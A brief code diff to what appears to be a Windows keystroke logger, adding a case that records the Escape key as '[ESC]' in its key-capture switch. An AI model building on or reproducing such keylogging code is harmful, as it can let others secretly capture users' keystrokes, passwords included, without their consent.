@@ -54,6 +54,9 @@ void startLogging(){
                 case VK_RWIN:
                     log << "[RWIN]";
                     break;
+                case VK_ESCAPE:
+                    log << "[ESC]";
+                    break;
                 case VK_MENU:
                     log << "[ALT]";
                 case VK_LBUTTON:
